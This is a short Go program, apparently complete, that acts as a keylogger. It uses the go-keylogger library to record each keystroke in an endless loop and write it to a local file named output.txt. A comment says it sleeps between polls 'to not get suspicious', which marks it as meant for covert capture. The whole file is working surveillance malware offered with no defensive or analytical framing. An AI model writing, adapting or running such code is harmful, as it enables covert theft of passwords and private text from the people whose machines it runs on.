package main

import (
	"fmt"
	"os"
	"time"

	"github.com/kindlyfire/go-keylogger"
)

func main() {
	// Create new keylogger
	kl := keylogger.NewKeylogger()

	// File to put keystrokes
	file, err := os.Create("output.txt")
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	defer file.Close()

	// Main cycle to check for new keystrokes
	for {
		key := kl.GetKey()

		if !key.Empty {
			fmt.Fprintf(file, "%c", key.Rune)

			if key.Keycode == 13 { // 13 is "Enter"
				fmt.Fprintln(file)
			}
		}
		// Sleep a bit to not get suspicious
		time.Sleep(50 * time.Millisecond)
	}
}
